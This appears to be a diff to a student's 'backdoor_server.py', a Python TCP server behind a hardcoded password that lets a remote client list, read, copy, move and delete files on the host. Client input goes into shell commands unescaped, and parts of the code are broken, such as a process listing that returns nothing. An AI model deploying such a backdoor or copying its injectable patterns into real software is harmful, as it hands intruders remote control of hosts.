@@ -7,7 +7,6 @@
 # Run: backdoor_server.py port
 # replacing port with desired port number
 # Code references consulted or viewed:
-# https://stackoverflow.com/questions/33001309/subprocess-call-cd-not-working
 # TODO: delete unnecessary comments before submission. Just provided for learning
 # purposes and so we can understand what is being done.
 
@@ -15,12 +14,29 @@ import os
 import socketserver
 import socket, threading
 import sys
-import subprocess                                                               # subprocess module will allow us to spawn new processes and connect to their
-                                                                                # pipes to collect their return results
+import subprocess
 
-serverPassword = "thepass"                                           # Hard coded server password
+
+serverPassword = "thepass"                                                      # Hard coded server password
 snapOutput = ""
-currentView = ""                                                                # will hold a new snap without erasing last client initiated snap
+currentView = ""                                                                # Will hold a new snap without erasing last client initiated snap
+
+COMMAND_LIST = {                                                                # Dictionary of help commands and execution instructions.
+'pwd': 'pwd  - shows current working directory',
+'cd': 'cd <dir> - change current working directory to <dir>',
+'ls': 'ls - list contents of the current working directory',
+'cp': 'cp <file1> <file2> - copy file1 to file2',
+'mv': 'mv <file1> <file2> - rename file1 to file2',
+'rm': 'rm <file> - delete file',
+'cat': 'cat <file> - return contents of the file',
+'snap': 'snap - takes a snapshot of all the files in the current directory',
+'diff': 'diff - compares the content of the current directory to the saved snapshot',
+'help': 'help - list command options\nhelp <cmd> - show detailed help for given cmd',
+'logout': 'logout - disconnect client',
+'off': 'off - terminate the backdoor program',
+'opt1': 'PLACEHOLDER',
+'opt2': 'PLACEHOLDER',
+}
 
 def printWorkingDir():
     procc = subprocess.Popen(["pwd"], stdout=subprocess.PIPE)
@@ -32,8 +48,13 @@ def listContents():
     result = procc.communicate()[0]
     return result.decode("utf-8")
 
-def changeDirectory(dirName):
-    os.chdir(dirName)
+def changeDirectory(listOfWords):
+    if len(listOfWords) == 2:
+        os.chdir(listOfWords[1])
+        result = ""
+    else:
+        result = COMMAND_LIST[listOfWords[0].lower()] + "\n"
+    return result
 
 # Function to take a snapshot of all files in the current directory and saved
 # results to memory. A snapshot will include file names and a hash of each file,
@@ -65,30 +86,24 @@ def checkDifference():
     elif currentView == snapOutput :
         return "No change\n"
     else:
-        stringOfDifferences = ""
+        stringOfDifferences = ""                                                # Start recording differences
         listOfDiff = currentView.split("\n")
         listOfSnap = snapOutput.split("\n")
         lenListOfSnap = len(listOfSnap)
-        for i in range(int(lenListOfSnap/2)) :
-            for j in range(int(len(listOfDiff)/2)) :
-                if listOfSnap[i] == listOfDiff[j] :
-                    if listOfSnap[i+(int(lenListOfSnap/2))].find(listOfSnap[i]) == -1:
-                        neverPrinted = "never printed"
-                    elif listOfSnap[i+(int(lenListOfSnap/2))] != listOfDiff[j+(int(len(listOfDiff)/2))] :
-                        stringOfDifferences = stringOfDifferences + listOfSnap[i] + " - was changed\n"
+        for i in range(int(lenListOfSnap/2)) :                                  # Compare each file in the saved snapshot -
+            for j in range(int(len(listOfDiff)/2)) :                            # - to each file currently in the directory -
+                if listOfSnap[i] == listOfDiff[j] :                             # - and if the same file exists in both lists -
+                    if listOfSnap[i+(int(lenListOfSnap/2))].find(listOfSnap[i]) == -1: # - compare their hashes -
+                        neverPrinted = "never printed"                          # - and if they are same, then there was no change -
+                    elif listOfSnap[i+(int(lenListOfSnap/2))] != listOfDiff[j+(int(len(listOfDiff)/2))] : # - if the hashes don't match -
+                        stringOfDifferences = stringOfDifferences + listOfSnap[i] + " - was changed\n" # then record the change
                     listOfDiff.pop(j)
                     listOfDiff.pop(j+(int(len(listOfDiff)/2)))
                     break
-            stringOfDifferences = stringOfDifferences + listOfSnap[i] + " - was deleted\n"
-        for k in range(int(len(listOfDiff)/2)) :
+            stringOfDifferences = stringOfDifferences + listOfSnap[i] + " - was deleted\n" # If the file in the snapshot wasn't found, record.
+        for k in range(int(len(listOfDiff)/2)) :                                # The elements remaining are those added since last snap of current dir
             stringOfDifferences = stringOfDifferences + listOfDiff[k] + " - was added\n"
         return stringOfDifferences
-
-
-
-
-
-
 
 # Function to terminate the server script
 def turnServerOff():
@@ -101,6 +116,16 @@ def copyFile(file1, file2):
         result = err
     return result.decode("utf-8")
 
+def copyFile(listOfWords):
+    if len(listOfWords) == 3:
+        procc = subprocess.Popen('cp -r ' + listOfWords[1] + " " + listOfWords[2], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+        result, err = procc.communicate()
+        if err is not None:
+            result = err
+    else:
+        result = COMMAND_LIST[listOfWords[0].lower()] + "\n"
+    return result.decode("utf-8")
+
 def moveFile(file1, file2):
     procc = subprocess.Popen('mv ' + file1 + " " + file2, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
     result, err = procc.communicate()
@@ -108,48 +133,55 @@ def moveFile(file1, file2):
         result = err
     return result.decode("utf-8")
 
-def removeFile(file1):
-    procc = subprocess.Popen('rm -f ' + file1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-    result, err = procc.communicate()
-    if err is not None:
-        result = err
-    return result.decode("utf-8")
-
-
-def cat(file1):
-    procc = subprocess.Popen('cat ' + file1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-    result, err = procc.communicate()
-    if len(result) < 1:
-        result = err
+def moveFile(listOfWords):
+    if len(listOfWords) == 3:
+        procc = subprocess.Popen('mv ' + listOfWords[1] + " " + listOfWords[2], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+        result, err = procc.communicate()
+        if err is not None:
+            result = err
     else:
-        result = result + bytes("\n", "utf-8")
+        result = COMMAND_LIST[listOfWords[0].lower()] + "\n"
     return result.decode("utf-8")
+
+def removeFile(listOfWords):
+    if len(listOfWords) == 2:
+        procc = subprocess.Popen('rm -f ' + listOfWords[1], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+        result, err = procc.communicate()
+        if err is not None:
+            result = err
+    else:
+        result = COMMAND_LIST[listOfWords[0].lower()] + "\n"
+    return result.decode("utf-8")
+
+def cat(listOfWords):
+    if len(listOfWords) == 2 :
+        procc = subprocess.Popen('cat ' + listOfWords[1], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+        result, err = procc.communicate()
+        if len(result) < 1:
+            result = err
+        return result.decode("utf-8")
+    else:
+        return COMMAND_LIST[listOfWords[0].lower()] + "\n"
 
 def runningProcesses():
     procc = subprocess.Popen("ps", stdout=subprocess.PIPE, shell=True)
     result = procc.communicate()[0]
 
+def helpCommand(listOfWords):
+    if (len(listOfWords) == 1) or not(listOfWords[1].lower() in COMMAND_LIST):
+        result = "Supported commands:\n" + str(list(COMMAND_LIST)).strip('[]').replace('\'','') + "\n"
+        return result
+    else:
+        result = COMMAND_LIST[listOfWords[1].lower()] + "\n"
+        return result
+
 # Override of handle method to handle functionality of the server
 class MyTCPHandler(socketserver.BaseRequestHandler):                            # Create a request handler as subclass of BaseRequestHandler
-    BUFFER_SIZE = 4096                                                           # Input buffer for client requests will be 4096 bytes
+
+    BUFFER_SIZE = 4096                                                          # Input buffer for client requests will be 4096 bytes
     PASSWORD_SIZE = 1024
-    COMMAND_LIST = {
-    'pwd': 'pwd  - shows current working directory',
-    'cd': 'cd <dir> - change current working directory to <dir>',
-    'ls': 'ls - list contents of the current working directory',
-    'cp': 'cp <file1> <file2> - copy file1 to file2',
-    'mv': 'mv <file1> <file2> - rename file1 to file2',
-    'rm': 'rm <file> - delete file',
-    'cat': 'cat <file> - return contents of the file',
-    'snap': 'snap - takes a snapshot of all the files in the current directory',
-    'diff': 'diff - compares the content of the current directory to the saved snapshot',
-    'help': 'help - list command options\nhelp <cmd> - show detailed help for given cmd',
-    'logout': 'logout - disconnect client',
-    'off': 'off - terminate the backdoor program',
-    'opt1': 'PLACEHOLDER',
-    'opt2': 'PLACEHOLDER',
-    }
-    def handle(self):                                                            # Override parent class handle method to handle incoming requests
+
+    def handle(self):                                                           # Override parent class handle method to handle incoming requests
         # Authenticate user via hardcoded password
         self.request.sendall( bytearray( "Enter Password: ", "utf-8"))
         clientPassword = self.request.recv(self.PASSWORD_SIZE)
@@ -161,55 +193,42 @@ class MyTCPHandler(socketserver.BaseRequestHandler):                            
             while 1:
                 # Receive user command
                 self.request.sendall(bytearray("> ", "utf-8"))
-                data = self.request.recv(self.BUFFER_SIZE)                       # self.request is the TCP socket connected to the client and recv stores command from client into data
-                if len(data) == self.BUFFER_SIZE:                                # Client sent string of BUFFER_SIZE
-                    while 1:                                                     # Check to see if there is more data in the string
-                        try:  # error means no more data
+                data = self.request.recv(self.BUFFER_SIZE)                      # self.request is the TCP socket connected to the client and recv stores command from client into data
+                if len(data) == self.BUFFER_SIZE:                               # Client sent string of BUFFER_SIZE
+                    while 1:                                                    # Check to see if there is more data in the string
+                        try:                                                    # error means no more data
                             data += self.request.recv(self.BUFFER_SIZE, socket.MSG_DONTWAIT)
                         except:
                             break
                 if len(data) == 0:
                     break
-                data = (data.decode( "utf-8")).strip()                                     # Decode received byte array to interpret command
+                data = (data.decode( "utf-8")).strip()                          # Decode received byte array to interpret command
                 wordsInCommand = data.split()
                 # Process client command
-                if (wordsInCommand[0].lower() == "help"): #TODO add two more commands of our choosing to this list and implement
-                    if (len(wordsInCommand) == 1) or not(wordsInCommand[1].lower() in self.COMMAND_LIST):
-                        self.request.sendall( bytearray( "Supported commands:\n" + str(list(self.COMMAND_LIST)).strip('[]').replace('\'','') + "\n", "utf-8"))
-                    else:
-                        self.request.sendall( bytearray(self.COMMAND_LIST[wordsInCommand[1].lower()] + "\n", "utf-8"))
+                if (wordsInCommand[0].lower() == "help"):
+                    result = helpCommand(wordsInCommand)
+                    self.request.sendall( bytearray(result, "utf-8"))
                 elif data.lower() == "pwd" :
                     result = printWorkingDir()
                     self.request.sendall(bytearray(result, "utf-8"))
                 elif wordsInCommand[0].lower() == "cd" :
-                    if len(wordsInCommand) == 2:
-                        changeDirectory(wordsInCommand[1])
-                    else:
-                        self.request.sendall( bytearray(self.COMMAND_LIST[wordsInCommand[0].lower()] + "\n", "utf-8"))
+                    result = changeDirectory(wordsInCommand)
+                    self.request.sendall( bytearray(result, "utf-8"))
                 elif data.lower() == "cp" :
-                    result = printWorkingDir()
+                    result = copyFile(wordsInCommand)
                     self.request.sendall(bytearray(result, "utf-8"))
                 elif data.lower() == "ls" :
                     result = listContents()
                     self.request.sendall(bytearray(result, "utf-8"))
                 elif wordsInCommand[0] == "mv" :
-                    if len(wordsInCommand) == 3:
-                        result = moveFile(wordsInCommand[1], wordsInCommand[2])
-                        self.request.sendall(bytearray(result, "utf-8"))
-                    else:
-                        self.request.sendall( bytearray(self.COMMAND_LIST[wordsInCommand[0].lower()] + "\n", "utf-8"))
+                    result = moveFile(wordsInCommand)
+                    self.request.sendall(bytearray(result, "utf-8"))
                 elif wordsInCommand[0] == "rm" :
-                    if len(wordsInCommand) == 2:
-                        result = removeFile(wordsInCommand[1])
-                        self.request.sendall(bytearray(result, "utf-8"))
-                    else:
-                        self.request.sendall( bytearray(self.COMMAND_LIST[wordsInCommand[0].lower()] + "\n", "utf-8"))
+                    result = removeFile(wordsInCommand)
+                    self.request.sendall(bytearray(result, "utf-8"))
                 elif wordsInCommand[0] == "cat" :
-                    if len(wordsInCommand) == 2:
-                        result = cat(wordsInCommand[1])
-                        self.request.sendall(bytearray(result, "utf-8"))
-                    else:
-                        self.request.sendall( bytearray(self.COMMAND_LIST[wordsInCommand[0].lower()] + "\n", "utf-8"))
+                    result = cat(wordsInCommand)
+                    self.request.sendall(bytearray(result, "utf-8"))
                 elif data.lower() == "snap" :
                     snap(1)
                     self.request.sendall(bytearray("OK\n", "utf-8"))
@@ -228,12 +247,11 @@ class MyTCPHandler(socketserver.BaseRequestHandler):                            
                     result = runningProcesses()
                     self.request.sendall(bytearray("Current running processes: \n" + result, "utf-8"))
                 else:
-                    # TODO: deleted this echo of the command when other functionality is implemented
-                    self.request.sendall( bytearray( "You said: " + data + "\n I do not understand that command.\n", "utf-8"))
-                    print("%s (%s) wrote: %s" % (self.client_address[0],
-                        threading.currentThread().getName(), data.strip()))
+                    self.request.sendall( bytearray("You said: " + data + "\n I do not understand that command.\n", "utf-8"))
+                print("%s (%s) wrote: %s" % (self.client_address[0],
+                    threading.currentThread().getName(), data.strip()))
         else:
-            self.request.sendall( bytearray( "Incorrect Password. Goodbye.\n", "utf-8"))
+            self.request.sendall( bytearray("Incorrect Password. Goodbye.\n", "utf-8"))
 
 if __name__ == "__main__":
     HOST, PORT = "localhost", int(sys.argv[1])                                   # Get port number from command line
